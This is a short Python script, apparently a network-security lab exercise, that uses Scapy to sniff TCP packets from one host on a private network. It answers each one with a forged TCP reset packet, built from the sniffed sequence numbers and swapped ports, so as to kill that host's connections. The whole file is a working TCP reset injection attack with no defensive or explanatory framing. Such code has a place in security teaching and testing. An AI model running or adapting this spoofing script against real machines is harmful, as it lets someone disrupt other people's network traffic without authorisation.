from scapy.all import *


def spoof_tcp(pkt):
    IPLayer = IP(dst="192.168.136.132")
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                   dport=pkt[TCP].sport, sport=pkt[TCP].dport
                   )
    spoofpkt = IPLayer/TCPLayer
    send(spoofpkt, verbose=0)


pkt = sniff(filter='tcp and src host 192.168.136.132', prn=spoof_tcp)
